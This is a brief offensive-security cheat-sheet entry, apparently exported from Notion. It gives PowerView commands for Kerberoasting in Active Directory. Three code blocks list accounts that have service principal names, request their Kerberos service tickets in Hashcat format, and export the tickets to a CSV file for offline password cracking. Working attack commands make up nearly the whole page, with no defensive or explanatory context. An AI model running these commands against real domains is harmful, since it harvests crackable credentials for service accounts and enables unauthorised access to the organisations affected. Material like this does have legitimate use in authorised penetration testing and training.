# Powerview: Extract Kerberos Tickets for SPN users and Crack

OS: Active_Directory
Description: Powerview: Extract Kerberos Tickets for SPN users and Crack
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerView (https://www.notion.so/PowerView-1454c8e523768011a934c27c986b7ef4?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### PowerView Extract Tickets

```jsx
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### Extract ticket from user identified

```jsx
Get-DomainUser -Identity USER_FOUND | Get-DomainSPNTicket -Format Hashcat
```

### Extract ticket from user identified and export to .csv

```jsx
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\MyCSVFILE.csv -NoTypeInformation
```